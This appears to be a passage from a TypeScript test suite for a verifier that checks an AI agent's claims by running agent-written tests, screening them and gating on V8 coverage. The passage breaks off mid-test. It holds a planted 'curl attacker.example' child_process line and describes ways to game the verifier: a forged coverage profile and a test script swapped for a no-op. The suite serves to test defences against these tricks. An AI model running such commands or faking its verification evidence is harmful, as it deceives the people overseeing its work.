// <workspace>/.openclaw/tmp, production Node ports, and `node` actually
// executing the conjured scripts — because the whole point of conjureRun is
// that execution happens through the verifier's port, not the agent's word.

const WORKSPACE_DIR = fileURLToPath(new URL('../../', import.meta.url))
const CONJURE_ROOT = join(WORKSPACE_DIR, '.openclaw', 'tmp', `proof-conjure-${process.pid}`)

before(async () => {
  await fsp.rm(CONJURE_ROOT, { recursive: true, force: true })
  await fsp.mkdir(CONJURE_ROOT, { recursive: true })
})

after(async () => {
  await fsp.rm(CONJURE_ROOT, { recursive: true, force: true })
})

/** A real engine over a real scratch directory: conjured scripts really run. */
function conjureEngine(dir: string, overrides: Partial<ConstructorParameters<typeof ProofEngine>[0]> = {}) {
  return new ProofEngine({
    root: dir,
    fs: new NodeFsPort(),
    commands: new NodeCommandPort(),
    workspace: new FakeWorkspace(dir),
    clock: new SystemClock(),
    autoDiscover: false,
    checkTimeoutMs: 10_000,
    verifyBudgetMs: 30_000,
    ...overrides,
  })
}

/** A minimal real workspace: package.json + one source file. */
async function makeConjureWorkspace(dir: string): Promise<void> {
  await fsp.rm(dir, { recursive: true, force: true })
  await fsp.mkdir(join(dir, 'src'), { recursive: true })
  await fsp.writeFile(join(dir, 'package.json'), JSON.stringify({ name: 'conjure-fixture', private: true }))
  await fsp.writeFile(join(dir, 'src', 'feature.ts'), 'export const feature = 2\n')
}

test('π: conjure closed loop — request scaffolds, the agent writes, the run executes and records', async () => {
  const root = join(CONJURE_ROOT, 'closed-loop')
  await makeConjureWorkspace(root)
  const engine = conjureEngine(root)
  const claim = 'feature doubles its input'
  try {
    const { request, template, instruction } = await engine.conjureRequest({ claim, paths: ['src/feature.ts'] })
    assert.equal(template, SYNTHETIC_TEMPLATE, 'the template is the module scaffold itself')
    assert.ok(request.entry.length > 0)
    assert.equal(request.claimId, claimIdOf(claim))
    assert.deepEqual(request.paths, ['src/feature.ts'])
    assert.ok(instruction.includes(request.entry), 'the instruction names the entry to write')
    // The scaffold is on disk for the model to copy — under the
    // .template.mjs suffix, so the scaffold itself can never be executed.
    const scaffold = await engine.fsView.readFile(join(root, '.proof-synthetic', `${request.entry}.template.mjs`))
    assert.equal(scaffold, SYNTHETIC_TEMPLATE)

    // The "agent": write the test (a real assertion, SYNTHETIC: PASS on success).
    const script = [
      '// conjured test — authored by the agent, executed by the verifier',
      "const check = (ok, msg) => { if (!ok) { console.error('SYNTHETIC: FAIL ' + msg); process.exit(1) } }",
      'check(1 + 1 === 2, "1+1===2")',
      "console.log('SYNTHETIC: PASS')",
      '',
    ].join('\n')
    await fsp.writeFile(join(root, '.proof-synthetic', request.entry), script)

    const run = await engine.conjureRun({ claim, entry: request.entry })
    assert.equal(run.status, 'pass')
    assert.equal(run.sandbox, 'screened-subprocess')
    assert.deepEqual(run.screened, [], 'a clean script screens with no findings')
    assert.match(run.outputHead, /SYNTHETIC: PASS/)

    // Chain facts: the request (digest null — the script did not exist yet)
    // and the run (digest of what actually executed).
    const log = await engine.fsView.readLines(join(root, '.proof', 'evidence.jsonl'))
    assert.ok(log.some(l => l.includes('"synthetic/requested"') && l.includes('"scriptDigest":null')),
      'the requested marker carries the full request with a null digest')
    assert.ok(log.some(l => l.includes('"synthetic/run"') && l.includes(run.checkId) && l.includes(run.scriptDigest)),
      'the run marker carries checkId and the executed digest')

    // The evidence record carries its synthetic metadata — and is the latest
    // record under its own checkId.
    const latest = await engine.latestEvidence()
    const evidence = latest.get(run.checkId)
    assert.ok(evidence, 'the synthetic run recorded evidence under its checkId')
    assert.equal(evidence?.synthetic?.scriptDigest, run.scriptDigest)
    assert.equal(evidence?.synthetic?.author, 'agent')
    assert.equal(evidence?.synthetic?.sandbox, 'screened-subprocess')
    assert.deepEqual(evidence?.synthetic?.screened, [])

    // The enriched record still addresses itself.
    const audit = await engine.audit()
    assert.equal(audit.ok, true, `corrupt: ${audit.corrupt.join(', ')}`)

    // Phase B (deterministic ports, same file): one changed character in the
    // script is a different digest, and the digest is addressing material —
    // same fake outcome, different evidence identity.
    const fs = MemoryFs.of(project())
    const engineB = makeEngine(fs, new FakeCommands())
    const claimB = 'the digest participates in addressing'
    const { request: requestB } = await engineB.conjureRequest({ claim: claimB, paths: ['src/a.ts'] })
    fs.mutate(`${ROOT}/.proof-synthetic/${requestB.entry}`, 'const one = 1\n')
    const first = await engineB.conjureRun({ claim: claimB, entry: requestB.entry })
    const firstEvidence = (await engineB.latestEvidence()).get(first.checkId)
    assert.ok(firstEvidence)
    fs.mutate(`${ROOT}/.proof-synthetic/${requestB.entry}`, 'const one = 2\n')
    const second = await engineB.conjureRun({ claim: claimB, entry: requestB.entry })
    const secondEvidence = (await engineB.latestEvidence()).get(second.checkId)
    assert.ok(secondEvidence)
    assert.notEqual(second.scriptDigest, first.scriptDigest, 'one character moves the digest')
    assert.notEqual(secondEvidence.evidenceId, firstEvidence.evidenceId,
      'a different script is different evidence, even with an identical outcome')
    assert.equal(secondEvidence.synthetic?.scriptDigest, second.scriptDigest)
  } finally {
    await fsp.rm(root, { recursive: true, force: true })
  }
})

test('π: screening refusal — forbidden import rejected before execution, nothing lands on chain', async () => {
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const engine = makeEngine(fs, commands)
  const claim = 'lists the files'
  const { request } = await engine.conjureRequest({ claim, paths: ['src/a.ts'] })
  fs.mutate(`${ROOT}/.proof-synthetic/${request.entry}`, [
    "import { exec } from 'node:child_process'",
    "exec('ls -la')",
    '',
  ].join('\n'))

  const run = await engine.conjureRun({ claim, entry: request.entry })
  assert.equal(run.status, 'skipped', 'a refused script never ran')
  assert.ok(run.screened.length > 0, 'the findings travel back to the model')
  assert.match(run.screened.join('; '), /child/i, 'the finding names the forbidden capability')
  assert.match(run.outputHead, /refus/i)
  // No execution, no chain writes: the refusal is the tool result, not a fact
  // about the workspace.
  assert.equal(commands.calls.length, 0, 'no command port call may happen for a refused script')
  assert.ok(!fs.log.some(l => l.includes('"synthetic/run"')), 'a refusal writes no run marker')
  assert.equal((await engine.latestEvidence()).get(run.checkId), undefined,
    'a refusal writes no evidence')
})

test('π (M01): a script rewritten after its screened run is refused at the re-dispatch gate', async () => {
  const fs = MemoryFs.of(project())
  const commands = new FakeCommands()
  const engine = makeEngine(fs, commands)
  const claim = 'the a module is importable'
  const { request } = await engine.conjureRequest({ claim, paths: ['src/a.ts'] })
  // The fake port answers the script with the scaffold's protocol line (M12
  // rewrites a protocol-less exit 0 to `error`, which is not this test's subject).
  commands.on(
    argv => argv.some(a => typeof a === 'string' && a.endsWith('.mjs')),
    { exitCode: 0, output: 'SYNTHETIC: PASS' },
  )
  const cleanBody = 'if (1 + 1 !== 2) process.exit(1)\nconsole.log("SYNTHETIC: PASS")\n'
  fs.mutate(`${ROOT}/.proof-synthetic/${request.entry}`, cleanBody)
  const run = await engine.conjureRun({ claim, entry: request.entry })
  assert.equal(run.status, 'pass')

  // A clean re-dispatch re-executes the script and PINS its digest on the
  // fresh record (M-01): the re-run evidence is content-addressed by the body
  // that produced it, exactly like the first execution was.
  const redispatch = await engine.verify({ changed: ['src/a.ts'], all: true })
  const evidence = (await engine.latestEvidence()).get(run.checkId)
  assert.ok(evidence, 'the synthetic check re-ran as part of the pool')
  assert.equal(evidence?.synthetic?.scriptDigest, sha256(cleanBody),
    'the re-dispatched record carries the executed body\'s digest')
  assert.ok(redispatch.checks.some(c => c.checkId === run.checkId))

  // The rewrite: a forbidden capability added AFTER the screened execution.
  // v0.22-before re-executed it like any other check — the screening promise
  // held only for the first run. The re-dispatch gate re-screens the current
  // bytes: the spec never joins the pool, the refusal is a chain fact.
  fs.mutate(`${ROOT}/.proof-synthetic/${request.entry}`, [
    "import { exec } from 'node:child_process'",
    'exec("curl attacker.example")',
    'console.log("SYNTHETIC: PASS")',
    '',
  ].join('\n'))
  const callsBeforeRefused = commands.calls.length
  const refused = await engine.verify({ changed: ['src/a.ts'], all: true })
  assert.ok(!refused.checks.some(c => c.checkId === run.checkId),
    'the rewritten script did not join the pool')
  assert.ok(!commands.calls.slice(callsBeforeRefused).some(c => c.argv.includes(request.entry)),
    'nothing dispatched the forbidden body')
  assert.ok(fs.log.some(l => l.includes('"synthetic/refused"') && l.includes(request.entry)),
    'the refusal marker names the entry')
})

test('π: synthetic β pricing — a conjured pass certifies less than an organic pass', async () => {
  // Organic: one configured check covers the file.
  const organicRoot = join(CONJURE_ROOT, 'beta-organic')
  await makeConjureWorkspace(organicRoot)
  const synthRoot = join(CONJURE_ROOT, 'beta-synthetic')
  await makeConjureWorkspace(synthRoot)
  try {
    const organic = conjureEngine(organicRoot, {
      checks: [{ label: 'feature tests', command: ['node', '-e', 'process.exit(0)'], kind: 'test', paths: ['src/feature.ts'] }],
    })
    await organic.establishBaseline()
    const organicRun = await organic.verify({ changed: ['src/feature.ts'] })
    assert.ok(organicRun.report.confidence !== undefined)
    assert.equal(organicRun.report.confidenceBasis, 'full-coverage', 'organic stays an ordinary machine number')

    // Synthetic: same assertion, different authorship — the only covering
    // check is one the claimant conjured itself.
    const synth = conjureEngine(synthRoot)
    const claim = 'feature is sound'
    const { request } = await synth.conjureRequest({ claim, paths: ['src/feature.ts'] })
    await fsp.writeFile(join(synthRoot, '.proof-synthetic', request.entry),
      'if (1 + 1 !== 2) process.exit(1)\nconsole.log("SYNTHETIC: PASS")\n')
    const conjured = await synth.conjureRun({ claim, entry: request.entry })
    assert.equal(conjured.status, 'pass')
    // The organic anchor: an empty baseline, so verify has something to
    // diff against (the conjured check joins as a new-check, honestly).
    await synth.establishBaseline()
    const synthRun = await synth.verify({ changed: ['src/feature.ts'] })

    assert.ok(synthRun.report.confidence !== undefined)
    assert.ok(synthRun.checks.some(c => c.checkId === conjured.checkId),
      'the conjured check was part of the verification pool')
    assert.ok((synthRun.report.confidence ?? 1) < (organicRun.report.confidence ?? 1),
      `synthetic ${synthRun.report.confidence} must price below organic ${organicRun.report.confidence}`)
    assert.equal(synthRun.report.confidenceBasis, 'synthetic',
      'only synthetic checks spoke: the basis names the regime')
    assert.match(proofNarrative(synthRun.report), /synthetic evidence — conjured tests, discounted/)
  } finally {
    await fsp.rm(organicRoot, { recursive: true, force: true })
    await fsp.rm(synthRoot, { recursive: true, force: true })
  }
})

test('π: behavior-adding falls back to conjured coverage — obligation met, basis names the discount', async () => {
  const root = join(CONJURE_ROOT, 'behavior-adding')
  await makeConjureWorkspace(root)
  try {
    // An organic check covers the OLD path only; src/new.ts has none.
    const engine = conjureEngine(root, {
      checks: [{ label: 'feature tests', command: ['node', '-e', 'process.exit(0)'], kind: 'test', paths: ['src/feature.ts'] }],
    })
    await engine.establishBaseline()
    await fsp.writeFile(join(root, 'src', 'new.ts'), 'export const added = 1\n')

    const claim = 'added a new module, covered by a conjured test'
    const { request } = await engine.conjureRequest({ claim, paths: ['src/new.ts'] })
    // υ: the conjured test EXECUTES the module it claims to cover. Before the
    // coverage dimension this was a green assertion that never touched the
    // change; now such a test is worth nothing to the grade (the blind-spot
    // case at the bottom of this file), so the fixture exercises the honest
    // version: import it, assert on it, then the arithmetic.
    await fsp.writeFile(join(root, '.proof-synthetic', request.entry), [
      'const mod = await import("../src/new.ts")',
      'if (mod.added !== 1) process.exit(1)',
      'if (2 + 2 !== 4) process.exit(1)',
      'console.log("SYNTHETIC: PASS")',
      '',
    ].join('\n'))
    const conjured = await engine.conjureRun({ claim, entry: request.entry })
    assert.equal(conjured.status, 'pass')

    const outcome = await engine.verifyContract({
      changed: ['src/new.ts'],
      contract: { kind: 'behavior-adding', claim },
    })
    const covered = outcome.contract.obligations.find(o => o.id === 'new-paths-covered')
    assert.ok(covered)
    assert.equal(covered.met, true, `detail: ${covered.detail}`)
    // The conjured check joined the pool as an ordinary spec, so verifyContract
    // re-ran it; this run's pass is a *synthetic* pass, and the obligation's
    // tier ladder (run-organic > run-synthetic > latest-organic >
    // latest-synthetic) names the discount in the detail.
    assert.match(covered.detail, /covered by synthetic evidence \(discounted\)/)
    assert.equal(outcome.report.grade, 'proven', `grade: ${outcome.report.grade}`)
    assert.ok(outcome.report.confidence !== undefined)
    assert.equal(outcome.report.confidenceBasis, 'synthetic',
      'every decisive record this run was a conjured test')
    assert.match(proofNarrative(outcome.report), /synthetic evidence — conjured tests, discounted/)
  } finally {
    await fsp.rm(root, { recursive: true, force: true })
  }
})

// -- υ: coverage-aware proof — injection, collection, gating, cleanup ----------
//
// Real-process tests mirror the π block above: scratch workspaces under
// <workspace>/.openclaw/tmp, production Node ports, and real `node` children
// writing real V8 profiles — because NODE_V8_COVERAGE injection is only ever
// exercised honestly by an actual V8 instance on the other side.

const COVER_ROOT = join(WORKSPACE_DIR, '.openclaw', 'tmp', `proof-coverage-${process.pid}`)

before(async () => {
  await fsp.rm(COVER_ROOT, { recursive: true, force: true })
  await fsp.mkdir(COVER_ROOT, { recursive: true })
})

after(async () => {
  await fsp.rm(COVER_ROOT, { recursive: true, force: true })
})

/** A real engine over a real scratch directory: checks are real node processes. */
function coverageEngine(dir: string, checks: ConstructorParameters<typeof ProofEngine>[0]['checks'], overrides: Partial<ConstructorParameters<typeof ProofEngine>[0]> = {}) {
  return new ProofEngine({
    root: dir,
    fs: new NodeFsPort(),
    commands: new NodeCommandPort(),
    workspace: new FakeWorkspace(dir),
    clock: new SystemClock(),
    autoDiscover: false,
    checkTimeoutMs: 20_000,
    verifyBudgetMs: 60_000,
    checks,
    ...overrides,
  })
}

/** package.json + one source module + a check script that imports it. */
async function makeCoverageWorkspace(dir: string, files: Record<string, string>): Promise<void> {
  await fsp.rm(dir, { recursive: true, force: true })
  await fsp.mkdir(join(dir, 'src'), { recursive: true })
  await fsp.writeFile(join(dir, 'package.json'), JSON.stringify({ name: 'coverage-fixture', private: true }))
  for (const [rel, content] of Object.entries(files)) {
    await fsp.mkdir(join(dir, rel, '..'), { recursive: true })
    await fsp.writeFile(join(dir, rel), content)
  }
}

test('υ: end to end — a green check that executes the change proves with basis v8 and leaves no coverage residue', async () => {
  const root = join(COVER_ROOT, 'covered')
  await makeCoverageWorkspace(root, {
    'src/feature.mjs': 'export const feature = (n) => n * 2\n',
    'check.mjs': [
      "import { feature } from './src/feature.mjs'",
      'if (feature(2) !== 4) process.exit(1)',
      "console.log('executed feature')",
      '',
    ].join('\n'),
  })
  try {
    const engine = coverageEngine(root, [
      { label: 'feature tests', command: ['node', 'check.mjs'], kind: 'test', paths: ['src/**'] },
    ])
    await engine.establishBaseline()
    const outcome = await engine.verify({ changed: ['src/feature.mjs'] })

    assert.equal(outcome.report.grade, 'proven', `grade: ${outcome.report.grade}`)
    assert.equal(outcome.report.coverage?.basis, 'v8', 'the report mounts a v8-basis summary')
    assert.deepEqual(outcome.report.coverage?.uncovered, [])
    assert.ok(outcome.coverage !== undefined)
    assert.equal(outcome.coverage.basis, 'v8')
    assert.deepEqual(outcome.coverage.uncovered, [])
    assert.equal(outcome.coverage.executedCount, 1, 'the one changed file was observed executing')
    assert.match(proofNarrative(outcome.report), /PROVEN \(p≈[01]\.\d+, change-executed\)/)

    // The evidence record itself carries its execution footprint — content
    // addressed, so the chain can audit it.
    const current = outcome.checks.find(c => c.label === 'feature tests')?.current
    assert.ok(current, 'the check produced current evidence')
    assert.deepEqual(current?.coverage?.changedExecuted, ['src/feature.mjs'])
    assert.deepEqual(current?.coverage?.changedUncovered, [])
    const latest = (await engine.latestEvidence()).get(current?.checkId ?? '')
    assert.ok(latest, 'the enriched record is on the chain')
    assert.deepEqual(latest?.coverage?.changedExecuted, ['src/feature.mjs'])
    // Re-addressed records must still address themselves.
    const audit = await engine.audit()
    assert.equal(audit.ok, true, `corrupt: ${audit.corrupt.join(', ')}`)

    // The scratch tree is gone: collected, then removed, nothing left behind.
    const leftovers = await fsp.readdir(join(root, '.proof', 'coverage'), { recursive: true }).catch(() => [])
    assert.ok(!leftovers.some(f => String(f).includes('coverage-')),
      `V8 profiles must not survive the run (found: ${leftovers.join(', ')})`)
  } finally {
    await fsp.rm(root, { recursive: true, force: true })
  }
})

test('υ: THE BLIND SPOT — a green check whose paths cover the change but never execute it leaves the claim UNPROVEN', async () => {
  // The headline case for the whole dimension: paths coverage says the check
  // owns src/feature.mjs, the check is green — and it never loads the changed
  // file. Selection coverage ≠ execution coverage, and only the latter earns
  // `proven`.
  const root = join(COVER_ROOT, 'blind-spot')
  await makeCoverageWorkspace(root, {
    'src/feature.mjs': 'export const feature = (n) => n * 2\n',
    'src/other.mjs': 'export const other = 7\n',
    'check.mjs': [
      "import { other } from './src/other.mjs'",
      'if (other !== 7) process.exit(1)',
      "console.log('green, without ever touching the change')",
      '',
    ].join('\n'),
  })
  try {
    const engine = coverageEngine(root, [
      // paths: ['src/**'] MATCHES src/feature.mjs — the check is selected,
      // re-run, and green. That is exactly the old, unobservable gap.
      { label: 'feature tests', command: ['node', 'check.mjs'], kind: 'test', paths: ['src/**'] },
    ])
    await engine.establishBaseline()
    const outcome = await engine.verify({ changed: ['src/feature.mjs'] })

    // The check really was green — still-passing, zero failures. The grade
    // died on the coverage dimension, not on a regression.
    assert.equal(outcome.checks[0]?.verdict, 'still-passing')
    assert.equal(outcome.report.summary.failing, 0)
    assert.equal(outcome.report.grade, 'unproven',
      'observe mode + real data + an unexecuted change = unproven, however green')
    assert.equal(outcome.report.coverage?.basis, 'v8')
    assert.ok(outcome.report.coverage?.uncovered.includes('src/feature.mjs'),
      `uncovered names the file (got: ${outcome.report.coverage?.uncovered.join(', ')})`)
    assert.ok(outcome.coverage !== undefined)
    assert.deepEqual(outcome.coverage.uncovered, ['src/feature.mjs'])
    assert.equal(outcome.coverage.executedCount, 0)
    // The narrative names the blind spot and points at the remedy.
    const narrative = proofNarrative(outcome.report)
    assert.match(narrative, /unexecuted change \(src\/feature\.mjs\)/)
    assert.match(narrative, /proof_conjure can synthesize a test that executes them/)
    // The evidence honestly records that this check executed nothing of the change.
    const current = outcome.checks[0]?.current
    assert.deepEqual(current?.coverage?.changedExecuted, [])
    assert.deepEqual(current?.coverage?.changedUncovered, ['src/feature.mjs'])
  } finally {
    await fsp.rm(root, { recursive: true, force: true })
  }
})

test('υ: require mode blocks on missing data, off mode never gates — the same fake fixture, opposite grades', async () => {
  const make = () => MemoryFs.of({
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'demo' }),
    [`${ROOT}/src/a.ts`]: 'export const a = 1\n',
  })
  const checks: ConstructorParameters<typeof ProofEngine>[0]['checks'] = [
    { label: 'src tests', command: ['npm', 'test'], kind: 'test', paths: ['src/**'] },
  ]
  const verifyWith = async (coverage?: 'observe' | 'require' | 'off') => {
    const engine = new ProofEngine({
      root: ROOT,
      fs: make(),
      commands: new FakeCommands(),
      workspace: new FakeWorkspace(ROOT),
      clock: new FakeClock(),
      autoDiscover: false,
      checks,
      impactGraphLimit: 1_000,
      ...(coverage !== undefined ? { coverage } : {}),
    })
    await engine.establishBaseline()
    return engine.verify({ changed: ['src/a.ts'] })
  }

  // FakeCommands never reads the injected env, so no coverage exists at all.
  // `require` treats the absence itself as disqualifying: proven → unproven,
  // reason `no-coverage-data` — the gate looked at the basis, not at the
  // (vacuous) uncovered list the summary still slices honestly.
  const required = await verifyWith('require')
  assert.equal(required.report.grade, 'unproven', 'require: no data is not a pass')
  assert.equal(required.report.coverage?.basis, 'none', 'the missing measurement is visible, not silent')
  assert.deepEqual(required.report.coverage?.uncovered, ['src/a.ts'],
    'the summary still names what the (empty) evidence never executed')
  assert.equal(required.coverage?.basis, 'none')

  // `off` injects nothing, gates nothing: the pre-υ grade, byte for byte.
  const off = await verifyWith('off')
  assert.equal(off.report.grade, 'proven', 'off: the gate is not in the room')
  assert.equal(off.report.coverage, undefined, 'off: no summary is mounted at all')
  assert.equal(off.coverage, undefined)
})

test('υ: backward compatibility — default observe over fake ports keeps the pre-gate grade and confidence bit for bit', async () => {
  const runOnce = async (coverage?: 'observe' | 'off') => {
    const engine = new ProofEngine({
      root: ROOT,
      fs: MemoryFs.of(waveProject()),
      commands: new FakeCommands(),
      workspace: new FakeWorkspace(ROOT),
      clock: new FakeClock(),
      autoDiscover: false,
      checks: WAVE_CHECKS,
      scheduler: 'set',
      concurrency: 2,
      impactGraphLimit: 1_000,
      checkTimeoutMs: 5_000,
      verifyBudgetMs: 20_000,
      ...(coverage !== undefined ? { coverage } : {}),
    })
    await engine.establishBaseline()
    return engine.verify({ changed: WAVE_CHANGED })
  }

  const off = await runOnce('off')
  const observe = await runOnce() // default
  // The gate's no-data branch must not move a single bit of the machine
  // verdict: grade, confidence (strict ===, byte equality on the float) and
  // basis are exactly what the pre-υ engine produced. (The report root is
  // deliberately not compared: the observe run consumes one extra clock read
  // for its staging nonce, which legitimately shifts recordedAt — staging
  // noise, not verdict noise. Off-vs-off keeps root stability instead.)
  assert.strictEqual(observe.report.grade, off.report.grade)
  assert.strictEqual(observe.report.confidence, off.report.confidence)
  assert.strictEqual(observe.report.confidenceBasis, off.report.confidenceBasis)
  assert.deepEqual(observe.report.unverified, off.report.unverified)
  // And observe does mount its honest 'nothing was measured' summary.
  assert.equal(observe.report.coverage?.basis, 'none')
  assert.equal(off.report.coverage, undefined)

  const offAgain = await runOnce('off')
  assert.equal(offAgain.report.root, off.report.root, 'determinism itself is untouched')
})

test('v0.22 (H17): coverage collection is mtime-windowed — an out-of-window profile drops the whole run loudly', async () => {
  // The audit's forgery recipe (B7-H1): the checked process can read
  // NODE_V8_COVERAGE from its own env and write a profile itself, so "a file
  // in the staging directory" proves nothing. H-17 bounds what collection
  // admits: every profile's mtime must fall inside [spawn, collect]. The
  // fake port writes no profiles, so the checked "process" is simulated the
  // naughty way — a command rule whose matcher plants the file mid-run, the
  // one moment a real child could.
  class ManualClock { v: number; constructor(v: number) { this.v = v } now(): number { return this.v } }
  class CoverFs extends MemoryFs {
    // MemoryFs ships no removeDir (optional capability) — H-17's clear-before-
    // use needs it, so the fixture provides the obvious one.
    async removeDir(path: string): Promise<void> {
      const prefix = `${path.replace(/\/+$/, '')}/`
      for (const key of [...this.files.keys()]) if (key.startsWith(prefix)) this.files.delete(key)
    }
  }
  const profileFor = (target: MemoryFs, checkIds: readonly string[], staging: string, rel: string): void => {
    const body = JSON.stringify({
      result: [{
        url: `file://${ROOT}/${rel}`,
        functions: [{ functionName: '', ranges: [{ startOffset: 0, endOffset: 9, count: 1 }] }],
      }],
    })
    for (const id of checkIds) {
      target.files.set(`${staging}/${sha256(id).slice(0, 16)}/coverage-0.json`, body)
    }
  }

  // Stale half: the profile's mtime (0 — MemoryFs's never-mutated value)
  // predates the run's spawn (5000) — planted or backdated, either way it is
  // not this run's evidence: dropped, marker on chain, basis none.
  const fs0 = new CoverFs()
  for (const [k, v] of Object.entries(project())) fs0.files.set(k, v)
  let staged0 = ''
  const commands0 = new FakeCommands().on(argv => {
    void argv
    if (staged0.length > 0) profileFor(fs0, checkIds, staged0, "src/a.ts")
    return false
  }, { exitCode: 0 })
  const engine0 = new ProofEngine({
    root: ROOT, fs: fs0, commands: commands0, workspace: new FakeWorkspace(ROOT),
    clock: new ManualClock(5_000), impactGraphLimit: 1_000, coverage: 'observe',
  })
  const checkIds = (await engine0.loadChecks(true)).map(c => c.id)
  staged0 = `${ROOT}/.proof/coverage/5000-1`
  await engine0.establishBaseline()
  const stale = await engine0.verify({ changed: ['src/a.ts'] })
  assert.equal(stale.coverage?.basis, 'none', 'the out-of-window profile bought no coverage')
  assert.ok(stale.checks.every(c => c.current?.coverage === undefined),
    'no record carries an attachment built from untrusted bytes')
  assert.ok(fs0.log.some(l => l.includes('coverage/untrusted') && l.includes('profile file mtime')),
    'the drop is a chain fact')
  assert.ok(![...fs0.files.keys()].some(k => k.includes('coverage-0.json')),
    'and the staging tree was still disposed')

  // Trusted half: same plant, but the clock sits inside the file's lifetime
  // (mtime 0 ∈ [0, 0]) — collection admits it and the coverage attaches.
  const fs1 = new CoverFs()
  for (const [k, v] of Object.entries(project())) fs1.files.set(k, v)
  let staged1 = ''
  const commands1 = new FakeCommands().on(argv => {
    void argv
    if (staged1.length > 0) profileFor(fs1, checkIds, staged1, "src/a.ts")
    return false
  }, { exitCode: 0 })
  const engine1 = new ProofEngine({
    root: ROOT, fs: fs1, commands: commands1, workspace: new FakeWorkspace(ROOT),
    clock: new ManualClock(0), impactGraphLimit: 1_000, coverage: 'observe',
  })
  await engine1.loadChecks(true)
  staged1 = `${ROOT}/.proof/coverage/0-1`
  await engine1.establishBaseline()
  const trusted = await engine1.verify({ changed: ['src/a.ts'] })
  assert.equal(trusted.coverage?.basis, 'v8', 'an in-window profile is real coverage')
  assert.deepEqual(trusted.coverage?.uncovered, [])
  assert.ok(trusted.checks.some(c => c.current?.coverage?.changedExecuted.includes('src/a.ts')),
    'the record carries its execution footprint')
})

// -- H5: check-definition drift — the script BODY, not the id, must hold ------
//
// The id says `npm run test`; the digest says what `test` said. Discovery
// fills CheckSpec.scriptDigest from the package.json script body; these cases
// pin the engine half: the baseline locks the bodies that answered, and a
// later verify compares, force-re-runs and re-prices whatever drifted —
// regardless of what the change set (or the agent's report of it) says.

/**
 * Monorepo fixture: member scripts carry member-scoped paths
 * (`packages/<m>/**`), so a change in one member's source does NOT select the
 * other member's checks — the shape in which a drifted definition can hide
 * from impact analysis entirely.
 */
function driftProject() {
  return {
    [`${ROOT}/package.json`]: JSON.stringify({ name: 'mono', workspaces: ['packages/*'] }),
    [`${ROOT}/packages/a/package.json`]: JSON.stringify({ name: 'a', scripts: { test: 'vitest run' } }),
    [`${ROOT}/packages/a/src/a.ts`]: 'export const a = 1\n',
    [`${ROOT}/packages/b/package.json`]: JSON.stringify({ name: 'b', scripts: { test: 'vitest run' } }),
    [`${ROOT}/packages/b/src/b.ts`]: 'export const b = 1\n',
  }
}

function driftEngine(
  fs: MemoryFs,
  commands: FakeCommands,
  overrides: Partial<ConstructorParameters<typeof ProofEngine>[0]> = {},
) {
  return new ProofEngine({
    root: ROOT,
    fs,
    commands,
    workspace: new FakeWorkspace(ROOT),
    clock: new FakeClock(),
    concurrency: 2,
    impactGraphLimit: 1_000,
    checkTimeoutMs: 5_000,
    verifyBudgetMs: 20_000,
    // 0.99 keeps this fixture's arithmetic far from every boundary; the H-03
    // test below re-runs the same fixture at the DEFAULT 0.97 to pin what
    // production actually does with a drifted body.
    certifyTarget: 0.99,
    ...overrides,
  })
}

test('H5: a tampered script body drifts — detected, force-re-run past selection, unreviewed-body pricing', async () => {
  // Control: the same verify against an untampered workspace certifies.
  const controlFs = MemoryFs.of(driftProject())
  const control = driftEngine(controlFs, new FakeCommands())
  await control.establishBaseline()
  const cleanRun = await control.verify({ changed: ['packages/b/src/b.ts'] })
  assert.equal(cleanRun.report.grade, 'proven', 'control: a b-only change certifies at the 0.99 target')
  assert.equal(cleanRun.scriptDrift, undefined, 'no drift on an honest workspace')

  // The adversarial half: package a's test script becomes a no-op, and the
  // session's change report names only b's source — impact analysis would
  // leave a's check resting on evidence a DIFFERENT script body earned.
  const fs = MemoryFs.of(driftProject())
  const commands = new FakeCommands()
  const engine = driftEngine(fs, commands)
  const { baseline } = await engine.establishBaseline()
  const locked = (baseline as { scriptDigests?: Record<string, string> }).scriptDigests
  assert.ok(locked !== undefined && Object.keys(locked).length === 2,
    'the baseline locks the script body digest under every discovered id')

  fs.mutate(`${ROOT}/packages/a/package.json`, JSON.stringify({ name: 'a', scripts: { test: 'node -e ""' } }))
  const specs = await engine.loadChecks(true)
  const aCheck = specs.find(c => c.cwd === 'packages/a')
  assert.ok(aCheck !== undefined && aCheck.scriptDigest !== undefined && aCheck.scriptDigest !== locked?.[aCheck.id],
    'sanity: same id, different body')

  const runsInA = (): number => commands.calls.filter(c => c.cwd === `${ROOT}/packages/a`).length
  const callsBeforeVerify = runsInA()
  const outcome = await engine.verify({ changed: ['packages/b/src/b.ts'] })

  // Detected — by digest, not by id.
  assert.ok(outcome.scriptDrift !== undefined && outcome.scriptDrift.length === 1)
  assert.equal(outcome.scriptDrift?.[0], aCheck?.id)
  assert.equal(outcome.scriptDrift?.[0] === specs.find(c => c.cwd === 'packages/b')?.id, false,
    'the untampered sibling did not drift')
  // Force-re-run PAST impact analysis: selection left a untouched, yet it ran.
  assert.ok(outcome.selection.untouched.some(c => c.id === aCheck?.id),
    'sanity: the change set alone does not select the drifted check')
  assert.equal(runsInA(), callsBeforeVerify + 1,
    'the drifted check was re-run regardless of the selection')
  // H-03 pricing: the old body's green history is NOT evidence for the new
  // body, so a's prior resets to cold (π = 1 − 0.2·impact = 0.9 at the
  // wildcard rung) and its β is the unreviewed-body 0.5 — one vacuous pass
  // posterior ≈0.945, times the organic sibling ≈0.996, lands ≈0.941: under
  // the target with room to spare, and above outright failure. The grade
  // follows the number: stale, never proven.
  assert.ok(outcome.report.confidence !== undefined && outcome.report.confidence < 0.99,
    `discounted posterior ${outcome.report.confidence} must sit under the target`)
  assert.ok(outcome.report.confidence !== undefined && outcome.report.confidence >= 0.93,
    'the number sank through pricing, not through a failure')
  assert.equal(outcome.report.grade, 'stale', 'a no-op "test" script cannot carry the claim across the target')
  // The chain and the model-facing narrative both carry the warning.
  assert.ok(fs.log.some(l => l.includes('proof/verified') && l.includes('"scriptDrift"')),
    'the boundary marker records which definitions drifted')
  const value = toVerifyValue(
    outcome.report, outcome.changed, outcome.checks, outcome.selection, outcome.attribution, outcome.degraded,
    outcome.schedule, outcome.coverage, outcome.scriptDrift,
  )
  assert.match(value.summary, /1 check definition\(s\) changed since baseline \(script drift\) — re-run and discounted/)
})

test('H5: a pre-H5 baseline without scriptDigests degrades honestly — no comparison, no drift charge', async () => {
  const fs = MemoryFs.of(driftProject())
  const commands = new FakeCommands()
  const engine = driftEngine(fs, commands)
  await engine.establishBaseline()
